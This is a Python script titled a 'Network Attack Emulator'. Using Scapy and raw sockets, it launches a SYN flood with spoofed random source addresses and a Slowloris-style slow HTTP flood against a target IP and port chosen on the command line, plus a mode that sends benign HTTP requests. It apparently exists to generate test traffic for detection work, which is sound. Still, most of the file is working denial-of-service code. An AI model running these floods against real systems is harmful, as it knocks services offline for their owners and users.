import time
import argparse
import random
import socket
import sys
try:
    from scapy.all import IP, TCP, send
except ImportError:
    print("[ERROR] Scapy is required to run the attack emulator. Run 'pip install scapy'")
    sys.exit(1)

def run_syn_flood(target_ip, target_port, count=1000):
    print("="*60)
    print(f"LAUNCHING VOLUMETRIC SYN FLOOD")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Packets to send: {count}")
    print("="*60)
    
    for i in range(count):
        # Generate random source IP and port to mimic a distributed attack
        src_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)
        
        # Build SYN packet
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        send(pkt, verbose=0)
        
        if (i + 1) % 100 == 0:
            print(f"  Sent {i + 1}/{count} SYN packets...")
            
    print(f"[OK] SYN flood completed. Sent {count} packets.")


def run_slow_http_flood(target_ip, target_port, connections=30):
    print("="*60)
    print(f"LAUNCHING SLOW-RATE HTTP CONNECTION FLOOD (Slowloris Emulation)")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Active sockets to hold: {connections}")
    print("="*60)
    
    sockets = []
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept-Language: en-US,en;q=0.5",
        "Connection: keep-alive"
    ]
    
    print(f"Establishing {connections} initial sockets...")
    for i in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            # Send partial request
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            for h in headers:
                s.send(f"{h}\r\n".encode("utf-8"))
            sockets.append(s)
        except socket.error:
            pass
            
    print(f"[OK] Sockets established. Holding connection paths open...")
    print("Sending slow keep-alive header bytes every 3 seconds... (Press Ctrl+C to stop)")
    
    try:
        while True:
            for s in list(sockets):
                try:
                    # Send an arbitrary header line slowly to keep the connection busy
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    sockets.remove(s)
            print(f"  Active sockets held: {len(sockets)}")
            time.sleep(3.0)
    except KeyboardInterrupt:
        print("\n[INFO] Terminating slow-rate flood. Closing sockets...")
        for s in sockets:
            s.close()


def run_benign_traffic(target_ip, target_port, count=20):
    print("="*60)
    print(f"GENERATING BENIGN HTTP REQUESTS (Legitimate Traffic)")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Total requests: {count}")
    print("="*60)
    
    # We use standard socket HTTP calls to generate benign clean flows
    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            # Complete request
            s.sendall(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode("utf-8"))
            response = s.recv(1024)
            s.close()
            print(f"  Request {i+1}/{count}: Legitimate session completed.")
        except socket.error as e:
            print(f"  Request {i+1}/{count} failed (Server port closed/timed out).")
        time.sleep(random.uniform(0.5, 2.0)) # normal human delay
        
    print("[OK] Legitimate traffic emulation completed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Network Attack Emulator")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="Target Port (default: 80)")
    parser.add_argument("--type", type=str, default="benign", choices=["syn", "slow", "benign"], help="Type of traffic (syn, slow, benign)")
    parser.add_argument("--count", type=int, default=500, help="Number of packets or connections to make")
    args = parser.parse_args()

    if args.type == "syn":
        run_syn_flood(args.target, args.port, count=args.count)
    elif args.type == "slow":
        run_slow_http_flood(args.target, args.port, connections=args.count)
    elif args.type == "benign":
        run_benign_traffic(args.target, args.port, count=args.count)
